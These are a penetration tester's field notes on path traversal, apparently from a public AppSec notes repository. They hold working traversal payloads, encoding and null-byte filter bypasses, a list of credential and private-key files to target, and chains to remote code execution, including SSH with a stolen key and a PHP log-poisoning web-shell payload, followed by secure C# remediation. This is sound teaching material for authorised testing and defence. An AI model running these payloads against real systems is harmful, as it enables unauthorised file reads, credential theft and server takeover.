# Path Traversal — Enterprise Penetration Testing Field Notes

> **Author:** Dheeraj Kumar Jayaswal — Senior Penetration Tester | 6+ Years Enterprise AppSec
>
> **Category:** Broken Access Control — OWASP A01:2021
>
> **Severity:** High to Critical — arbitrary file read, configuration exposure, credential theft, RCE via chained exploitation
>
> **Real-world impact:** Path traversal is one of the most consistently underestimated vulnerabilities in enterprise applications. Reading `/etc/passwd` makes a good demonstration but the real prizes are configuration files, application source code, private keys, and database credentials that allow lateral movement across the environment.

---

## 📖 What Is Path Traversal?

Path traversal (also called directory traversal) occurs when user-controlled input is used to construct a file system path without sufficient sanitisation, allowing an attacker to navigate outside the intended directory using `../` sequences.

```
Intended behaviour:
  /var/www/uploads/ + user_input(report.pdf) = /var/www/uploads/report.pdf ✓

Path traversal attack:
  /var/www/uploads/ + ../../../../etc/passwd = /etc/passwd ← reads system file

Windows equivalent:
  C:\inetpub\uploads\ + ..\..\..\..\Windows\System32\drivers\etc\hosts
```

---

## 🔍 Phase 1 — Finding Injection Points

```
Parameters to target:
  file=, filename=, path=, filepath=, page=, include=,
  template=, doc=, document=, resource=, load=, read=,
  src=, source=, dir=, folder=, download=, export=

Common enterprise features:
  GET /api/download?file=invoice_1042.pdf
  GET /api/template?name=report_template.html
  GET /api/logs?path=application.log
  GET /api/export?filename=data_export.csv
  POST /api/render?template=email/welcome.html
  GET /file-server/download?name=user_upload.zip
```

---

## 💥 Phase 2 — Exploitation

### Basic Traversal

```
Linux targets:
  ../../../etc/passwd
  ../../../etc/shadow          ← password hashes (requires root)
  ../../../etc/hosts           ← internal hostnames
  ../../../proc/self/environ   ← environment variables (secrets!)
  ../../../proc/self/cmdline   ← process command line
  ../../../home/appuser/.ssh/id_rsa  ← SSH private key

Windows targets:
  ..\..\..\Windows\System32\drivers\etc\hosts
  ..\..\..\inetpub\wwwroot\web.config  ← ASP.NET secrets
  ..\..\..\Windows\win.ini
  ..\..\..\Users\Administrator\.ssh\id_rsa

Enterprise .NET specific:
  ../../../inetpub/wwwroot/web.config
  ../../../inetpub/wwwroot/appsettings.json
  ../../../inetpub/wwwroot/appsettings.Production.json
  ../../../App_Data/database.mdf
```

### Encoding Bypasses

```
URL encoding:
  ..%2F..%2F..%2Fetc%2Fpasswd
  %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

Double URL encoding:
  ..%252F..%252F..%252Fetc%252Fpasswd

Unicode / overlong encoding:
  ..%c0%af..%c0%af..%c0%afetc%c0%afpasswd   (overlong slash)
  ..%ef%bc%8f..%ef%bc%8f (fullwidth solidus)

Null byte injection (older apps):
  ../../../etc/passwd%00.pdf
  ../../../etc/passwd%00.jpg
  → Null byte terminates string in C-based apps
  → Extension check bypassed: .pdf accepted, null byte cuts it

Path normalization bypass:
  ....//....//....//etc/passwd    (double dots + slash)
  ..././..././..././etc/passwd    (mixed separators)
  ..\..\..\etc\passwd             (Windows backslash on Linux apps)

Filter bypass (when ../ is stripped):
  ....// → after stripping ../ becomes ../  (recursive replacement bypass)
  ..%2F  → URL encoded slash not decoded before filter check
```

### High-Value File Targets in Enterprise

```
Application secrets (CRITICAL):
  /proc/self/environ                     → environment variables including secrets
  /var/www/html/.env                     → Laravel / PHP secrets
  /app/.env                              → Docker container secrets
  /opt/app/config/database.yml           → Rails database credentials
  /etc/nginx/sites-enabled/app.conf      → reverse proxy config (reveals internals)
  /etc/apache2/sites-enabled/000-default → Apache vhost config

Source code (ASP.NET / IIS):
  /inetpub/wwwroot/web.config
  /inetpub/wwwroot/appsettings.json
  /inetpub/wwwroot/global.asax
  /inetpub/wwwroot/bin/App.dll          → binary, extract strings for secrets

SSH keys:
  /root/.ssh/id_rsa                      → root private key
  /home/appuser/.ssh/id_rsa              → app user private key
  /home/ubuntu/.ssh/authorized_keys      → who can access via SSH

Logs containing credentials:
  /var/log/apache2/access.log            → URL params logged = credential exposure
  /var/log/nginx/access.log
  /opt/tomcat/logs/catalina.out          → Java app startup logs (DB passwords)
  /var/log/auth.log                      → authentication attempts
```

### Chaining to RCE

```
Chain 1 — Path traversal → private key → SSH access:
  Step 1: Read /root/.ssh/id_rsa via traversal
  Step 2: Save private key locally, chmod 600
  Step 3: ssh -i stolen_key root@target-server.com
  → Full server shell access

Chain 2 — Path traversal → web.config → SQL credentials → DB compromise:
  Step 1: Read web.config → extract connectionString
  Step 2: Use credentials to connect to SQL Server directly
  → Full database access

Chain 3 — Path traversal → log poisoning → code execution:
  Step 1: Inject PHP code in access log via User-Agent:
    User-Agent: <?php system($_GET['cmd']); ?>
  Step 2: Include the log file via traversal:
    ?file=../../../var/log/apache2/access.log&cmd=id
  → Code in log is executed = RCE
  → Only works if app uses include() or similar on the file content
```

> **Enterprise context:** In an enterprise engagement, a file download endpoint `GET /api/reports/download?file=Q1_Report.pdf` was vulnerable to path traversal. Using `../../../proc/self/environ`, I retrieved the process environment variables which included `DATABASE_URL=postgresql://appuser:Pr0dDB!2024@prod-db01:5432/appdb` and `AWS_SECRET_ACCESS_KEY=...`. The combination of database credentials and AWS keys — both exposed through a single path traversal — was the highest-severity finding of the engagement.

---

## 🗂️ Systematic Testing Checklist

```
DISCOVERY
☐ Find all file/path/resource parameters in Burp HTTP History
☐ Test any feature that downloads, displays, or renders a named file

BASIC TRAVERSAL
☐ ../../../etc/passwd (Linux)
☐ ..\..\..\Windows\win.ini (Windows)
☐ Note depth needed — try 3, 4, 5, 6 levels of ../

ENCODING BYPASSES (if basic blocked)
☐ URL encode: ..%2F..%2F..%2Fetc%2Fpasswd
☐ Double encode: ..%252F..%252F..%252Fetc%252Fpasswd
☐ Null byte: ../../../etc/passwd%00.pdf
☐ Mixed separators: ....//....//etc/passwd

HIGH-VALUE TARGETS
☐ /proc/self/environ — environment variables
☐ /var/www/html/.env or /app/.env — application secrets
☐ web.config / appsettings.json — .NET credentials
☐ /root/.ssh/id_rsa — SSH key
☐ Application logs containing credentials

CHAIN TESTING
☐ If credentials found — attempt database connection (with authorisation)
☐ If SSH key found — document finding without use
```

---

## 📋 Enterprise Pentest Report Template

**Finding Title:** Path Traversal in Report Download — Environment Variables and Database Credentials Exposed

**Severity:** Critical | **CVSS v3.1:** 9.1

**Endpoint:** `GET /api/reports/download?file=<FILENAME>`

```
Payload: GET /api/reports/download?file=../../../proc/self/environ HTTP/1.1

Response: DATABASE_URL=postgresql://appuser:Pr0dDB!2024@prod-db01:5432/appdb
          AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI...
          JWT_SECRET=ProductionSigningKey2024
```

**Remediation:**

```csharp
// ✅ SECURE — Canonicalize path and verify it stays within allowed directory
public IActionResult DownloadReport(string filename)
{
    // 1. Reject any path separators in the filename
    if (filename.Contains('/') || filename.Contains('\\') || filename.Contains(".."))
        return BadRequest("Invalid filename");

    // 2. Build safe path within the reports directory only
    string reportsDir = Path.GetFullPath("/var/app/reports/");
    string requestedPath = Path.GetFullPath(Path.Combine(reportsDir, filename));

    // 3. Verify the resolved path is still within the reports directory
    if (!requestedPath.StartsWith(reportsDir))
        return Forbid();   // Path traversal attempt detected

    // 4. Verify file exists and serve it
    if (!System.IO.File.Exists(requestedPath))
        return NotFound();

    return PhysicalFile(requestedPath, "application/octet-stream", filename);
}
```

---

## 🧭 Key Takeaways

**1. The depth of traversal matters — automate the level count.**
Application files sit at varying depths from the web root. Always try `../` at 3, 4, 5, and 6 levels deep. Use Burp Intruder to automate depth variation rather than manually crafting each one.

**2. `/proc/self/environ` is often more valuable than `/etc/passwd`.**
Modern enterprise applications run as non-root users, so `/etc/shadow` is inaccessible and `/etc/passwd` shows only system accounts. `/proc/self/environ` shows the application process's environment variables — which include database credentials, API keys, and secrets injected at container startup. This is the first target after confirming traversal.

**3. Null byte injection still works on some enterprise legacy stacks.**
Older PHP applications (PHP < 5.3.4) and some C-based applications truncate strings at null bytes. If the application appends an extension (`.pdf`, `.txt`) to user input before reading the file, `../../../etc/passwd%00` bypasses the extension check. Test this on any application that appends a fixed extension.

**4. Log poisoning to RCE requires both traversal and code inclusion.**
The log poisoning chain only works if the application reads the file content and passes it through an interpreter (PHP `include()`, template rendering). If the application merely returns the file bytes as a download, the injected code is harmless. Assess whether the file read function interprets or simply streams.

---

## 🔗 References
- [PortSwigger Path Traversal Research](https://portswigger.net/web-security/file-path-traversal)
- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [PayloadsAllTheThings — Path Traversal](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal)

---
<div align="center">

*Part of [AppSec From The Trenches](README.md) — Real notes from 6+ years of enterprise penetration testing.*

[![LinkedIn](https://img.shields.io/badge/LinkedIn-Dheeraj%20Kumar%20Jayaswal-0077B5?style=flat-square&logo=linkedin&logoColor=white)](https://linkedin.com/in/dheerajkumarjayaswal)

</div>
